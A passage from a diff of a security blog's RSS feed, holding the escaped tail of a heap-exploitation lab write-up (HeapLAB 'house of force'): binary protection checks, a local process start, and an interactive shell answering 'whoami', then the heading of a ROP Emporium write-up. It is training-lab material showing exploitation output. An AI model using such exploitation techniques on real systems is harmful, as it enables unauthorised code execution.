+    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+    RUNPATH:  b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/.glibc/glibc_2.28_no-tcache/libc-2.28.so&amp;#39;&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;23154&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
+$ whoami
+adamgold
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+        
+        </description>
+    </item>
     
     <item>
       <title>ROP Emporium Ret2CSU Writeup</title>
